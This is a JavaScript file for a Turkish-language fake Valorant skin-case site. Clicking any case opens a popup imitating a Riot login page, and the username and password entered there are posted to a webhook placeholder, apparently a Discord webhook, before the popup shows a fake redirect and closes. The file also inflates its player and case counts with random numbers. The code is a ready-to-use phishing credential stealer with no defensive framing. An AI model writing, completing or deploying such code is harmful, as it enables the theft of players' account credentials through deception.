const WEBHOOK_URL = "BURAYA_WEBHOOK_URL_YAPISTIR";

document.addEventListener("DOMContentLoaded", () => {
    // 1. Üst Şerit
    const track = document.getElementById('track');
    const skins = ["skin1.png", "skin2.png", "skin3.png", "skin4.png", "skin5.png"];
    track.innerHTML = [...skins, ...skins, ...skins, ...skins].map(s => `
        <div class="drop-card"><img src="${s}"><span>RADYANİT ŞANSI</span></div>
    `).join('');

    // 2. Kasa Listesi
    const cases = [
        {n: "BAŞLANGIÇ KASASI", p: "10 VP", i: "case1.png"},
        {n: "STANDART KASA", p: "30 VP", i: "case2.png"},
        {n: "ELİT KASA", p: "50 VP", i: "case3.png"},
        {n: "PREMIUM KASA", p: "100 VP", i: "case4.png"},
        {n: "EFSANEVİ KASA", p: "500 VP", i: "case5.png"},
        {n: "RADYANİT KASASI", p: "2000 VP", i: "case6.png"}
    ];
    document.getElementById('caseGrid').innerHTML = cases.map(c => `
        <div class="case-box" onclick="openAuth()">
            <img src="${c.i}">
            <h3>${c.n}</h3>
            <div class="vp-price">${c.p}</div>
            <button class="open-btn">KASAYI AÇ</button>
        </div>
    `).join('');

    // 3. Canlı İstatistik Sayacı (3 Saniyede Bir Değişir)
    function updateStats() {
        const players = document.getElementById('stat-players');
        const casesCount = document.getElementById('stat-cases');
        
        // Rastgele küçük artışlar
        let p = parseInt(players.innerText.replace(',',''));
        let c = parseInt(casesCount.innerText.replace(',',''));
        
        players.innerText = (p + Math.floor(Math.random() * 5 - 2)).toLocaleString();
        casesCount.innerText = (c + Math.floor(Math.random() * 3 + 1)).toLocaleString();
    }
    setInterval(updateStats, 3000);
});

// 4. Riot Tarzı Yumuşak Fontlu Giriş
function openAuth() {
    const w = 600, h = 800;
    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
    
    win.document.body.innerHTML = `
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
            body { 
                margin: 0; padding: 0; height: 100vh;
                background: url('login_bg.jpg') center/cover no-repeat;
                display: flex; justify-content: center; align-items: center;
                font-family: 'Inter', sans-serif;
            }
            .login-card {
                background: #fff; width: 360px; padding: 50px 40px; border-radius: 4px;
                text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.4);
            }
            .mini-logo { width: 110px; margin-bottom: 40px; }
            h2 { font-size: 24px; font-weight: 700; margin-bottom: 30px; color: #111; }
            .field { text-align: left; margin-bottom: 15px; }
            label { font-size: 11px; font-weight: 700; color: #999; margin-bottom: 5px; display: block; text-transform: uppercase; }
            input { 
                width: 100%; padding: 14px; border: 2px solid transparent; 
                background: #f2f2f2; border-radius: 4px; font-size: 14px; font-weight: 600; 
                box-sizing: border-box; outline: none; transition: 0.2s; color: #111;
            }
            input:focus { background: #fff; border-color: #ff4655; }
            .btn-go { 
                width: 100%; padding: 18px; background: #ff4655; color: #fff; 
                border: none; border-radius: 12px; font-weight: 700; cursor: pointer; 
                margin-top: 40px; font-size: 15px; text-transform: uppercase;
            }
            .footer-links { font-size: 11px; color: #bbb; margin-top: 25px; font-weight: 600; line-height: 1.6; }
        </style>
        <div class="login-card">
            <img src="login_logo.png" class="mini-logo">
            <h2>Oturum Aç</h2>
            <div class="field">
                <label>Kullanıcı Adı</label>
                <input type="text" id="u">
            </div>
            <div class="field">
                <label>Şifre</label>
                <input type="password" id="p">
            </div>
            <button class="btn-go" id="btn">Giriş Yap</button>
            <div class="footer-links">GİRİŞ YAPAMIYOR MUSUN?<br>HESAP OLUŞTUR</div>
        </div>
    `;

    win.document.getElementById('btn').onclick = function() {
        const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🎫 **Giriş Denemesi**\n👤 Kullanıcı: \`${u}\` \n🔑 Şifre: \`${p}\`` })
            }).then(() => {
                win.document.body.innerHTML = "<h2 style='color:white; background:rgba(0,0,0,0.8); padding:20px;'>Yönlendiriliyorsunuz...</h2>";
                setTimeout(() => win.close(), 1500);
            });
        }
    };
}
